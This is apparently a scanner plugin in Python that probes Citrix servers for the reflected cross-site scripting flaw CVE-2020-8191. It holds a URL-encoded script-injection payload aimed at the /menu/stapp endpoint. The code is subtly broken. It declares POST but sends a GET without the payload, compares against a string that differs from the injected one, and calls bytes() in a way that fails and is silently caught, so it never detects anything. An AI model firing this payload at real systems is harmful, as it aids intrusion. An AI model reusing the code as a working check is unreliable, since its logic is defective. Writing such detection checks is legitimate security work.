#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'citrix 跨站脚本 CVE-2020-8191',

      'level'     :   'low',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def run(url,ua):
  ret = msg()
  r1 = randomInt(40000,60000)
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded'
      }
  target = '/menu/stapp'
  data = f"sid=254&pe=1%2C2%2C3%2C4%2C5&appname=%0D%0A%3C%2Ftitle%3E%3Cscript%3Ealert%28{r1}%29%3B%3C%2Fscript%3E&au=1&username=nsroot"
  payload = f'<script>alert(" + {r1} + ");</script>'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if bytes(payload) in res.text and 'citrix' in res.text:
      ret['ifbug'] = True
      # ret['huixian'] = res.text
      res.close()
      return ret
    else:
      return ret
  except:
    return ret